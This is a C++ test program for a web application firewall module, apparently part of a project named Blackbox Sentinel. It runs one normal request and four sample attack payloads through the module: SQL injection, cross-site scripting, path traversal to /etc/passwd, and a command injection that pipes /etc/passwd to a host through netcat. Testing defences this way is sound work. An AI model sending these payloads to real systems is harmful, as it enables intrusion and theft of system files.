#include <iostream>
#include <vector>
#include <iomanip>
#include <xinfer/xinfer.hpp>
#include <blackbox/event.hpp>
#include "../src/modules/05_waf/waf_module.hpp"

int main() {
    std::cout << "==========================================================" << std::endl;
    std::cout << " Blackbox Sentinel Module Test 2: WAF & API Defense       " << std::endl;
    std::cout << "==========================================================" << std::endl;

    try {
        xinfer::Engine engine(xinfer::Target::OpenVINO);
        std::string model_url = 
            "https://github.com/onnx/models/raw/main/validated/vision/classification/squeezenet/model/squeezenet1.1-7.onnx";
        
        std::cout << "\n[ModelHub] Loading model backbone..." << std::endl;
        engine.load_model(model_url);

        sentinel::modules::waf::WafModule waf;
        waf.initialize("{}");
        waf.start();

        std::vector<std::string> test_payloads = {
            "GET /api/v1/products?category=electronics HTTP/1.1",               // Normal
            "POST /login HTTP/1.1 Content-Length: 45 ' OR 1=1 --",              // SQL Injection
            "GET /search?q=<script>alert('XSS')</script> HTTP/1.1",             // Cross-Site Scripting
            "GET /files?file=../../../../etc/passwd HTTP/1.1",                   // Path Traversal
            "POST /api/exec HTTP/1.1 payload=; cat /etc/passwd | nc 10.0.0.1"   // Command Injection
        };

        std::cout << "\nEvaluating " << test_payloads.size() << " HTTP Request Payloads...\n" << std::endl;

        for (size_t i = 0; i < test_payloads.size(); ++i) {
            blackbox::SecurityEvent ev;
            ev.event_id = 2001 + i;
            ev.type = blackbox::EventType::NetworkPacket;
            ev.source_ip = "192.168.1." + std::to_string(100 + i);
            ev.port = 80;
            ev.description = test_payloads[i];

            // Evaluate payload through WAF Module
            waf.on_security_event(ev);

            std::cout << "Payload #" << (i + 1) << ": " << test_payloads[i] << std::endl;
            std::cout << "  -> Anomaly Score : " << std::fixed << std::setprecision(2) << ev.anomaly_score << std::endl;
            std::cout << "  -> Threat Level  : " << blackbox::threat_level_to_string(ev.level) << std::endl;
            std::cout << "  -> Action Taken  : " << (ev.action_taken == blackbox::ActionType::EBPFBlockIP ? "eBPF BLOCK IP" : "ALLOW") << std::endl;
            std::cout << "  -> Details       : " << ev.description << "\n" << std::endl;
        }

        waf.stop();
        std::cout << "[PASS] WAF module test completed successfully!" << std::endl;
        std::cout << "==========================================================" << std::endl;

    } catch (const std::exception& e) {
        std::cerr << "Test Error: " << e.what() << std::endl;
        return -1;
    }
    return 0;
}